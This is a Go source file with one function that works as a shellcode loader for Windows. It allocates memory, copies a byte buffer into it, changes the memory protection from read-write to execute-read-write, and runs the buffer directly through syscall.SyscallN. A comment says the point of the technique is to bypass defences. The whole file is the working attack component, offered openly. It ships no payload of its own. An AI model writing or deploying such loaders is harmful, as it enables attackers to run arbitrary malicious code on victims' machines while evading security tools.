package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

/*
Diirect syscall with PAGE_READWRITE -> PAGE_EXECUTE_READWRITE
as a way to bypass defences

inspiration: https://www.youtube.com/watch?v=gH9qyHVc9-M
*/
func DirectSyscall(bytes []byte) {
	addr, _, err := VirtualAlloc.Call(
		uintptr(0),
		uintptr(len(bytes)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if err != nil && err.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[-] VirtualAlloc failed: %s", err))
	}

	RtlMoveMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&bytes[0])),
		uintptr(len(bytes)),
	)
	oldProtect := PAGE_READWRITE
	_, _, err = VirtualProtect.Call(
		addr,
		uintptr(len(bytes)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil && err.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[-] VirtualProtect failed: %s", err))
	}

	_, _, errSyscall := syscall.SyscallN(addr, 0, 0, 0, 0)
	if errSyscall != 0 {
		panic(fmt.Sprintf("[-] SyscallN failed: %s", err))
	}
}
